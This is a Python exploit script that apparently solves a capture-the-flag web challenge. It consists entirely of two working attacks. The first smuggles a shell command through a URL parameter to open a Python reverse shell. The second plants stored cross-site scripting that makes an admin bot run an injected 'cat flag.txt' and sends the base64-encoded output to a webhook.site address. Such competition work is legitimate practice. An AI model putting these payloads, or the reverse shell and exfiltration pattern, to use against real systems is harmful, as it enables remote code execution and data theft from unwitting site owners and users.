#Unintended

from requests import *

url = "http://chal.competitivecyber.club:13336/"

res = post(f'{url}/visit', data={"path":f"api/ca\tl?modifier=-1;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"reverse shell ip address\",ip port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"})



print(res.text)



#Intended

import requests

username = (
    '<script>'
    'fetch("http://127.0.0.1:1337/api/cal?modifier=;cat%20flag.txt", {credentials: "include"})'
    '.then(response => response.text())'
    '.then(text => {'
    '  var b64data = btoa(text);'
    '  var img = new Image();'
    '  img.src = "https://webhook.site/35adca5a-f27e-400b-9d80-79685a6536e0/?data=" + b64data;'
    '})'
    '.catch(error => {'
    '  var img = new Image();'
    '  img.src = "https://webhook.site/35adca5a-f27e-400b-9d80-79685a6536e0/?error=" + encodeURIComponent(error);'
    '});'
    '</script>'
)

data = {
    "username": username,
    "high_score": 123
}

response = requests.post('http://chal.competitivecyber.club:13337/api/stats', json=data)
id = response.json()['id']


path = f'api/stats/{id}'
admin_response = requests.post(
    'http://chal.competitivecyber.club:13336/visit',
    data={'path': path}
)
print("Admin Response:", admin_response.text)